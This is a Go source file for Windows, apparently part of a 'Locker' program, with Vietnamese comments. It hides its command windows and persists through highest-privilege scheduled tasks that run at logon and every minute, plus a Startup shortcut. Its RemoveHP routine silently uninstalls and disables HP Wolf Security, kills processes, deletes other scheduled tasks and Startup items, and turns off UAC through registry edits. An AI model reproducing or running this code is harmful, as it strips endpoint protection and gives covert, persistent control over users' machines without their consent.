package script

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func Cmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,       // Ẩn cửa sổ
		CreationFlags: 0x08000000, // Không tạo cửa sổ mới
	}
	cmd.Start()
}

func LaunchAdminDetached(exePath string) {
	// Sử dụng powershell để gọi quyền Admin (runas)
	// Sau đó dùng 'start' để tách nhánh tiến trình
	Cmd("explorer.exe", exePath)
	fmt.Println(exePath)
}

func CreateTask(appPath string, name string) {
	Cmd(
		"schtasks",
		"/create",
		"/tn", name,
		"/tr", appPath,
		"/sc", "onlogon",
		"/delay", "0000:10",
		"/rl", "highest",
		"/f",
	)
	Cmd(
		"schtasks",
		"/create",
		"/tn", name+"_",
		"/tr", appPath,
		"/sc", "minute", // Đổi từ onlogon sang minute
		"/mo", "1", // Khoảng thời gian là 5 phút
		"/rl", "highest",
		"/f",
	)
	createStartupShortcut()
}

func createStartupShortcut() {
	// 1. Lấy đường dẫn tuyệt đối của file thực thi hiện tại (PGM hiện tại)
	executablePath, err := os.Executable()
	if err != nil {
		return
	}

	// 2. Lấy đường dẫn thư mục Startup của người dùng hiện tại
	// C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
	homeDir, _ := os.UserHomeDir()
	startupDir := filepath.Join(homeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Tên file shortcut (ví dụ: MyProgram.lnk)
	shortcutPath := filepath.Join(startupDir, "Locker.lnk")

	// 3. Tạo file script VBS tạm thời để tạo Shortcut
	// Vì Go không có hàm tạo .lnk trực tiếp trong thư viện chuẩn
	vbsScript := fmt.Sprintf(`
		Set oWS = WScript.CreateObject("WScript.Shell")
		sLinkFile = "%s"
		Set oLink = oWS.CreateShortcut(sLinkFile)
		oLink.TargetPath = "%s"
		oLink.WorkingDirectory = "%s"
		oLink.Save
	`, filepath.ToSlash(shortcutPath), filepath.ToSlash(executablePath), filepath.ToSlash(filepath.Dir(executablePath)))

	vbsPath := filepath.Join(os.TempDir(), "create_shortcut.vbs")
	err = os.WriteFile(vbsPath, []byte(vbsScript), 0644)
	if err != nil {
		return
	}
	defer os.Remove(vbsPath) // Xóa script sau khi chạy xong

	// 4. Thực thi script VBS bằng lệnh cscript
	Cmd("cscript", "//nologo", vbsPath)
}

func EqualValue(a, b string) bool {

	// thử parse thành số
	f1, err1 := strconv.ParseFloat(a, 64)
	f2, err2 := strconv.ParseFloat(b, 64)

	if err1 == nil && err2 == nil {
		return f1 == f2
	}

	// nếu không phải số → so sánh string
	return strings.EqualFold(a, b)
}

func RemoveHP() {
	psScript := `
		# Gỡ HP Wolf Security
		Get-WmiObject -Class Win32_Product | Where-Object {
			$_.Name -like "*HP Wolf*" -or
			$_.Name -like "*HP Sure Click*" -or
			$_.Name -like "*HP Security*"
		} | ForEach-Object {
			Write-Host "Removing $($_.Name)..."
			$_.Uninstall()
		}

		# Dừng và vô hiệu hóa Service
		$services = Get-Service | Where-Object { $_.Name -like "*HP*" -and $_.DisplayName -like "*Wolf*" }
		foreach ($s in $services) {
			Stop-Service -Name $s.Name -Force -ErrorAction SilentlyContinue
			Set-Service -Name $s.Name -StartupType Disabled
		}

		# Xóa folder
		$paths = @(
			"C:\Program Files\HP\HP Wolf Security",
			"C:\Program Files (x86)\HP\HP Wolf Security",
			"C:\ProgramData\HP\Wolf"
		)
		foreach ($path in $paths) {
			if (Test-Path $path) {
				Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
			}
		}
	`

	// Khởi tạo lệnh chạy PowerShell
	// -Command "-" cho phép nhận script từ stdin hoặc truyền trực tiếp chuỗi
	Cmd("powershell", "-NoProfile", "-NonInteractive", "-Command", psScript)
	Cmd("taskkill", "/IM", "wscript.exe", "/f")
	Cmd("taskkill", "/IM", "script.exe", "/f")
	a := []string{"Backup_mes", "copdatatudong", "Ontop_Hourly", "OntopSilent", "updatabackupkho", "updatabackupkho", "VNC"}
	for _, i := range a {
		Cmd("schtasks", "/delete", "/tn", i, "/f")
	}
	homeDir, _ := os.UserHomeDir()
	startupDir := filepath.Join(homeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	files, _ := os.ReadDir(startupDir)
	os.RemoveAll("C:\\Temp\\Tool")
	for _, file := range files {
		fullname := filepath.Join(startupDir, file.Name())
		if file.IsDir() {

			files2, _ := os.ReadDir(fullname)
			for _, f := range files2 {
				fullname2 := filepath.Join(startupDir, file.Name(), f.Name())
				Cmd("taskkill", "/IM", f.Name(), "/F")
				time.Sleep(50 * time.Millisecond)
				os.Remove(fullname2)
			}
			os.RemoveAll(fullname)
		} else if !strings.EqualFold(filepath.Ext(file.Name()), ".lnk") {
			os.Remove(fullname)
		}
	}
	systemPolicies := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

	configs := []struct {
		Key   registry.Key
		Path  string
		Name  string
		Value uint32
	}{
		{registry.LOCAL_MACHINE, systemPolicies, "EnableLUA", 0},
		{registry.LOCAL_MACHINE, systemPolicies, "ConsentPromptBehaviorAdmin", 0},
		{registry.LOCAL_MACHINE, systemPolicies, "PromptOnSecureDesktop", 0},
		{registry.CURRENT_USER, `Software\Microsoft\Windows\Windows Error Reporting`, "DontShowUI", 1},
	}

	for _, cfg := range configs {
		// Mở Key với quyền ghi (SET_VALUE)
		k, err := registry.OpenKey(cfg.Key, cfg.Path, registry.SET_VALUE)
		if err != nil {
			continue
		}

		// Ghi giá trị DWORD
		k.SetDWordValue(cfg.Name, cfg.Value)
		k.Close()
	}

}
